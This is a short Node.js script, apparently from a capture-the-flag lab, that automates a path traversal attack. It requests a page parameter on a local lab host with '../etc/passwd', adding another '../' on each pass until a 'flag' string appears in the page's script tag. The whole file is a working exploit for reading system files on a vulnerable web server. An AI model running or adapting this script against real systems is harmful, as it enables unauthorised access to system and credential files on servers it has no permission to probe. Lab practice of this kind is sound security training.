// @ts-check
import got from 'got'
import * as cheerio from 'cheerio'

const searchedFile = `../etc/passwd`
const baseUrl = `http://192.168.56.101/?page=`

async function traverseDirectory(query) {
    const url = baseUrl + query;
    console.log(url)
    const htmlPage = await got(url).text()

    const $ = cheerio.load(htmlPage)
    const firstScriptTag = $('script').first().text();

    if (firstScriptTag.match(/flag/)) {
        console.log(firstScriptTag)
        return
    } else {
        console.log(firstScriptTag)
        const newQuery = `../${query}`
        return traverseDirectory(newQuery)
    }
}

await traverseDirectory(searchedFile)